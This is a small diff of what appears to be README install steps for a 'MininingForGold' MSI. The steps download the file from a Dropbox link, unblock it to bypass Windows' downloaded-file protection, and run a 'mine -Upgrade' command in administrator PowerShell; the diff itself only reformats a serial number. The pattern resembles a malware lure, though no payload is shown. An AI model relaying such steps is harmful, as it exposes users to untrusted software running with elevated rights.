@@ -22,7 +22,7 @@ Step 1) Download Setup.MininingForGold.msi https://www.dropbox.com/s/ihgb1rjrtlw
 Step 2) Right click Setup.MininingForGold.msi -> Properties -> Unblock the msi file
 ```
 ```sh
-Step 3) Install with serial number: __1111111-1171111__
+Step 3) Install with serial number: **1111111-1171111**
 ```
 ```sh
 Step 4) Open a new Powershell ISE window as Administrator and run this command <strong>mine -Upgrade</strong>
